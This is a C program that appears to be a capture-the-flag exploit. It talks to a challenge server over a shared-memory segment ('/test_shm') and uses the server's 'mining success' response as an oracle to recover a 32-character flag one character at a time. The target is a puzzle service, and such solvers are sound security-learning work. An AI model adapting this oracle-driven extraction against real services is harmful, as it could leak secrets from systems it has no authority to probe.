#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>

#define NUM_ALPHA 27
const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_";
int combs[27][5] = {
    {171, 18, 1, 1, 1},
    {253, 183, 1, 1, 36},
    {233, 234, 1, 1, 13},
    {245, 203, 1, 1, 52},
    {229, 254, 1, 1, 10},
    {224, 217, 1, 1, 3},
    {244, 192, 1, 1, 7},
    {249, 118, 1, 1, 6},
    {241, 27, 1, 1, 15},
    {234, 252, 1, 1, 21},
    {216, 151, 1, 1, 2},
    {177, 152, 1, 1, 16},
    {242, 119, 1, 1, 5},
    {243, 181, 1, 1, 11},
    {248, 159, 1, 1, 11},
    {251, 28, 1, 1, 12},
    {252, 247, 1, 1, 11},
    {215, 236, 1, 1, 26},
    {243, 181, 1, 1, 9},
    {177, 34, 1, 1, 14},
    {237, 202, 1, 1, 16},
    {-1, -1, -1, -1, -1},
    {159, 155, 1, 1, 12},
    {200, 173, 1, 1, 3},
    {245, 166, 1, 1, 16},
    {251, 79, 1, 1, 15},
    {253, 48, 1, 1, 14},
};

char *client_msg = NULL, *server_msg = NULL;

void set_IPC() {
    int server_fd = shm_open("/test_shm", O_RDWR, 0);
    void *addr = mmap(0, 0x400, PROT_READ | PROT_WRITE, MAP_SHARED, server_fd, 0);
    client_msg = addr;
    server_msg = addr + 512;
}

void send_message(char *msg) {
    *(int*)(client_msg + 4) = 1;
    *(int*)(client_msg + 8) = 5; // it's fine
    memcpy(client_msg + 16, msg, 5);
    *(int*)(client_msg) = 1;
    while (*(int*)(client_msg) == 1);

    *(int*)server_msg = 0;
    *(int*)(client_msg + 4) = 2;
    *(int*)(client_msg) = 1;
    while (*(int*)(client_msg) == 1);
    while (*(int*)server_msg != 1);
    *(int*)server_msg = 0;
}

int check_mining_success() {
    *(int*)(client_msg + 4) = 2;
    *(int*)(client_msg) = 1;

    while (*(int*)server_msg != 1);
    *(int*)server_msg = 0;
    return *(int*)(server_msg + 8) == 15; // it's fine
}

void send_messages(char f, int *comb) {
    char msg[6] = {f, f, f, f, f, 0};
    int i, j, last = 0;
    for (i = 0; i < 5; i++) {
        int min = 1000, mini = -1;
        for (j = 0; j < 5; j++) {
            if (msg[j] == 64) continue;
            if (min > comb[j])
                min = comb[j], mini = j;
        }

        for (; last < min; last++)
            send_message(msg);
        
        msg[mini] = 64;
    }
}

char get_flag_byte(int flag_idx) {
    int cur[5] = {0}, i, j;
    int comb[5] = {0};
    char ret = 'V'; // The only failing one
    for (i = 0; i < NUM_ALPHA; i++) {
        if (combs[i][0] == -1)
            continue;
        int *nxt = combs[i];  
        for (j = 0; j < 5; j++)
            comb[j] = (256 + nxt[j] - cur[j]) % 256;

        send_messages(65 + flag_idx, comb);

        for (j = 0; j < 5; j++)
            cur[j] = nxt[j];
        if (check_mining_success()) {
            ret = alphabet[i];
            break;
        }
    }

    for (j = 0; j < 5; j++)
        comb[j] = (256 - cur[j]) % 256;
    send_messages(65 + flag_idx, comb);

    return ret;
}

int main()
{
    int i;
    set_IPC();
    for (i = 0; i < 0x20; i++) {
        // printf("Running %d\n", i);
        char t = get_flag_byte(i);
        printf("%c", t);
    }
    printf("\n");
    return 0;
}